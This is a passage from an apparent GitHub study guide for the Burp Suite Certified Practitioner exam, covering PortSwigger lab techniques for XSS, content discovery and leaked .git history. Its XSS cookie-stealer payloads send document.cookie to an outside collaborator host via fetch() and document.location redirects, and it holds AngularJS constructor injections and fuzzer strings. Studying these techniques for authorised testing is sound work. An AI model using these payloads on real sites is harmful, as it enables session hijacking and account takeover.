100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIdentify the vulnerability through Burp scanner issue results.\u003cbr\u003e\nIn this case, using the identified XSS, Steal the admin user's cookies by crafting the payload in the \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e insertion point.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"'\u0026quot;\u0026gt;\u0026lt;svg/onload=fetch(`//OASTIFY.COM/${encodeURIComponent(document.cookie)}`)\u0026gt;:CURRENT-USER-LOGIN-COOKIE-2ND-PART\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e'\"\u0026gt;\u0026lt;svg/onload=fetch(`//OASTIFY.COM/${encodeURIComponent(document.cookie)}`)\u0026gt;:CURRENT-USER-LOGIN-COOKIE-2ND-PART\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUrl encode key characters.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/admin-cookie-stealer1.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/admin-cookie-stealer1.png\" alt=\"admin-cookie-stealer\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUse the admin user's cookie to access the admin panel by replacing it in the current browser session.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures\" rel=\"nofollow\"\u003ePortSwigger Lab: Scanning non-standard data structures\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch1 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eFoothold\u003c/h1\u003e\u003ca id=\"user-content-foothold\" class=\"anchor\" aria-label=\"Permalink: Foothold\" href=\"#foothold\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch1 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eContent Discovery\u003c/h1\u003e\u003ca id=\"user-content-content-discovery\" class=\"anchor\" aria-label=\"Permalink: Content Discovery\" href=\"#content-discovery\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eEnumeration of target start with fuzzing web directories and files. Either use the Burp engagement tools, content discovery option to find hidden paths and files or use \u003ccode\u003eFFUF\u003c/code\u003e to enumerate web directories and files. Looking at \u003ccode\u003erobots.txt\u003c/code\u003e or \u003ccode\u003esitemap.xml\u003c/code\u003e that can reveal content.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"wget https://raw.githubusercontent.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/main/wordlists/burp-labs-wordlist.txt\n\nffuf -c -w ./burp-labs-wordlist.txt -u https://TARGET.web-security-academy.net/FUZZ\"\u003e\u003cpre\u003ewget https://raw.githubusercontent.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/main/wordlists/burp-labs-wordlist.txt\n\nffuf -c -w ./burp-labs-wordlist.txt -u https://TARGET.web-security-academy.net/FUZZ\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBurp engagement tool, content discovery using my compiled word list \u003ca href=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/wordlists/burp-labs-wordlist.txt\"\u003eburp-labs-wordlist\u003c/a\u003e as custom file list.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/content-discovery.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/content-discovery.png\" alt=\"content-discovery.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eExamine the git repo branches on local downloaded copy, using \u003ccode\u003egit-cola\u003c/code\u003e tool. Then select \u003cstrong\u003eUndo last commit\u003c/strong\u003e and extract admin password from the diff window.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"wget -r https://TARGET.web-security-academy.net/.git/\n\ngit-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003ewget -r https://TARGET.web-security-academy.net/.git/\n\ngit-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/git-cola.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/git-cola.png\" alt=\"git-cola\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history\" rel=\"nofollow\"\u003ePortSwigger Lab: Information disclosure in version control history\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAlways open \u003ccode\u003esource code\u003c/code\u003e to look for any developer comments that reveal hidden files or paths. Below example lead to \u003ca href=\"#deserialization\"\u003esymphony token deserialization\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dev-code-debug-comment.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dev-code-debug-comment.png\" alt=\"DEV code debug comment deserial\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eDOM-Based XSS\u003c/h2\u003e\u003ca id=\"user-content-dom-based-xss\" class=\"anchor\" aria-label=\"Permalink: DOM-Based XSS\" href=\"#dom-based-xss\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#identify-dom-xss\"\u003eDOM XSS Indicators\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#dom-invader\"\u003eDOM XSS Identified with DOM Invader\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#vuln-angularjs\"\u003eDOM XSS AngularJS\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#doc-write-location-search\"\u003eDOM XSS document.write in select\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#dom-xss-jsonparse-web-messages\"\u003eDOM XSS JSON.parse web messages\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#dom-xss-addeventlistener-javascript-url\"\u003eDOM XSS AddEventListener JavaScript URL\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#dom-xss-addeventlistener-ads-message\"\u003eDOM XSS AddEventListener Ads Message\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#reflected-dom-xss\"\u003eDOM XSS Eval Reflected Cookie Stealer\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#dom-xss-lastviewedproduct-cookie\"\u003eDOM XSS LastviewedProduct Cookie\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eIdentify DOM-XSS\u003c/h3\u003e\u003ca id=\"user-content-identify-dom-xss\" class=\"anchor\" aria-label=\"Permalink: Identify DOM-XSS\" href=\"#identify-dom-xss\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eDOM-based XSS vulnerabilities arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes code to a sink that supports dynamic code execution.\nTest which characters enable the escaping out of the \u003ccode\u003esource code\u003c/code\u003e injection point, by using the fuzzer string below.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"\u0026lt;\u0026gt;\\'\\\u0026quot;\u0026lt;script\u0026gt;{{7*7}}$(alert(1)}\u0026quot;-prompt(69)-\u0026quot;fuzzer\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e\u0026lt;\u0026gt;\\'\\\"\u0026lt;script\u0026gt;{{7*7}}$(alert(1)}\"-prompt(69)-\"fuzzer\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eReview the \u003ccode\u003esource code\u003c/code\u003e to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the \u003cstrong\u003esources\u003c/strong\u003e , \u003cstrong\u003esinks\u003c/strong\u003e or \u003cstrong\u003emethods\u003c/strong\u003e that may lead to exploit, list of samples:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003edocument.write()\u003c/li\u003e\n\u003cli\u003ewindow.location\u003c/li\u003e\n\u003cli\u003edocument.cookie\u003c/li\u003e\n\u003cli\u003eeval()\u003c/li\u003e\n\u003cli\u003edocument.domain\u003c/li\u003e\n\u003cli\u003eWebSocket()\u003c/li\u003e\n\u003cli\u003eelement.src\u003c/li\u003e\n\u003cli\u003epostMessage()\u003c/li\u003e\n\u003cli\u003esetRequestHeader()\u003c/li\u003e\n\u003cli\u003eFileReader.readAsText()\u003c/li\u003e\n\u003cli\u003eExecuteSql()\u003c/li\u003e\n\u003cli\u003esessionStorage.setItem()\u003c/li\u003e\n\u003cli\u003edocument.evaluate()\u003c/li\u003e\n\u003cli\u003eJSON.parse\u003c/li\u003e\n\u003cli\u003eng-app\u003c/li\u003e\n\u003cli\u003eURLSearchParams\u003c/li\u003e\n\u003cli\u003ereplace()\u003c/li\u003e\n\u003cli\u003einnerHTML\u003c/li\u003e\n\u003cli\u003elocation.search\u003c/li\u003e\n\u003cli\u003eaddEventListener\u003c/li\u003e\n\u003cli\u003esanitizeKey()\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eDom Invader\u003c/h3\u003e\u003ca id=\"user-content-dom-invader\" class=\"anchor\" aria-label=\"Permalink: Dom Invader\" href=\"#dom-invader\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUsing Dom Invader plug-in and set the canary to value, such as \u003ccode\u003edomxss\u003c/code\u003e, it will detect DOM-XSS sinks that can be exploit.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dom-invader.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dom-invader.png\" alt=\"DOM Invader\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eVulnerable AngularJS\u003c/h3\u003e\u003ca id=\"user-content-vulnerable-angularjs\" class=\"anchor\" aria-label=\"Permalink: Vulnerable AngularJS\" href=\"#vulnerable-angularjs\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eAngularJS expression below can be injected into the search function when angle brackets and double quotes HTML-encoded. The vulnerability is \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e by noticing the search string is enclosed in an \u003cstrong\u003eng-app\u003c/strong\u003e directive and \u003ccode\u003e/js/angular 1-7-7.js\u003c/code\u003e script included. Review the HTML code to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the \u003ccode\u003eng-app\u003c/code\u003e directive telling AngularJS that this is the root element of the AngularJS application.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ng-app-code-review.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ng-app-code-review.png\" alt=\"domxss-on-constructor.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003ePortSwigger lab payload below:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"{{$on.constructor('alert(1)')()}}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003e$on\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003econstructor\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'alert(1)'\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md\"\u003eCookie stealer payload\u003c/a\u003e using \u003ccode\u003eon.constructor\u003c/code\u003e that can be placed in iframe, hosted on an exploit server, resulting in the victim session cookie being send to Burp Collaborator.\u003cbr\u003e\n\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.0.1---1.1.5-(shorter)\" rel=\"nofollow\"\u003ePortSwigger cheat sheet for cross site scripting reference\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"{{$on.constructor('document.location=\u0026quot;https://OASTIFY.COM?c=\u0026quot;+document.cookie')()}}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e{\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003e$on\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-en\"\u003econstructor\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'document.location=\"https://OASTIFY.COM?c=\"+document.cookie'\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e}\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNote:\u003c/strong\u003e The session cookie property must not have the \u003cstrong\u003eHttpOnly\u003c/strong\u003e secure flag set in order for XSS to succeed.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/domxss-on-constructor.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/domxss-on-constructor.png\" alt=\"domxss-on-constructor.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression\" rel=\"nofollow\"\u003ePortSwigger Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://youtu.be/QpQp2JLn6JA\" rel=\"nofollow\"\u003ez3nsh3ll give an amazingly detail understanding on the constructor vulnerability in this lab on YouTube\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eDoc Write Location search\u003c/h3\u003e\u003ca id=\"user-content-doc-write-location-search\" class=\"anchor\" aria-label=\"Permalink: Doc Write Location search\" href=\"#doc-write-location-search\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe target is vulnerable to DOM-XSS in the stock check function. \u003ccode\u003esource code\u003c/code\u003e reveal \u003ccode\u003edocument.write\u003c/code\u003e is the sink used with \u003ccode\u003elocation.search\u003c/code\u003e allowing us to add \u003cstrong\u003estoreId\u003c/strong\u003e query parameter with a value containing the JavaScript payload inside a \u003ccode\u003e\u0026lt;select\u0026gt;\u003c/code\u003e statement.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/dom-xss-doc-write-inside-select.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/dom-xss-doc-write-inside-select.png\" alt=\"DOM-XSS doc write inside select\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003ePerform a test using below payload to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the injection into the modified GET request, using \u003ccode\u003e\"\u0026gt;\u003c/code\u003e to escape.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"/product?productId=1\u0026amp;storeId=fuzzer\u0026quot;\u0026gt;\u0026lt;/select\u0026gt;fuzzer\"\u003e\u003cpre\u003e/product?productId=1\u0026amp;storeId=fuzzer\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003eselect\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003efuzzer\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/get-dom-xss.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/get-dom-xss.png\" alt=\"get-dom-xss.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eDOM XSS \u003ca href=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md\"\u003ecookie stealer payload\u003c/a\u003e in a \u003ccode\u003edocument.write\u003c/code\u003e sink using source \u003ccode\u003elocation.search\u003c/code\u003e inside a \u003ccode\u003e\u0026lt;select\u0026gt;\u003c/code\u003e element. This can be send to victim via exploit server in \u003ccode\u003e\u0026lt;iframe\u0026gt;\u003c/code\u003e. To test the cookie stealer payload I again on my browser in console added a test POC cookie to test sending it to Collaborator.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026quot;\u0026gt;\u0026lt;/select\u0026gt;\u0026lt;script\u0026gt;document.location='https://OASTIFY.COM/?domxss='+document.cookie\u0026lt;/script\u0026gt;//\"\u003e\u003cpre\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003eselect\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan 